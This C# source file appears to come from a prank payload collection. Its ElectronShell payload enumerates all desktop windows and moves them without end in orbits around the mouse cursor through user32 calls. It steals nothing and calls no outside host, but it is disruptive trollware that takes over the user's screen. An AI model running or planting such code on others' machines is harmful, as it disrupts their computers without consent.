using System.Runtime.InteropServices;
using Caesium.Payloads;

public abstract partial class ElectronShell : IPayload
{
    [LibraryImport("user32.dll")]
    private static partial void EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [LibraryImport("user32.dll")]
    private static partial void SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

    [LibraryImport("user32.dll")]
    private static partial void GetCursorPos(out Point lpPoint);

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    public struct Point { public int X; public int Y; }

    public static void Execute()
    {
        List<IntPtr> windows = new();
        float t = 0;

        // 1. Collect all top-level windows
        EnumWindows((hWnd, _) => {
            windows.Add(hWnd);
            return true;
        }, IntPtr.Zero);

        while (true)
        {
            t += 0.05f;
            GetCursorPos(out var mouse);

            for (var i = 0; i < windows.Count; i++)
            {
                // Each window gets a unique orbital radius and speed based on its index
                float radius = 100 + (i * 15);
                var speed = t * (1.0f + (1.0f / (i + 1)));

                var x = mouse.X + (int)(MathF.Cos(speed) * radius);
                var y = mouse.Y + (int)(MathF.Sin(speed) * radius);

                // SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE = 0x0001 | 0x0004 | 0x0010
                SetWindowPos(windows[i], IntPtr.Zero, x, y, 0, 0, 0x0015);
            }
            
            // Physics update rate
            Thread.Sleep(10);
        }
    }
}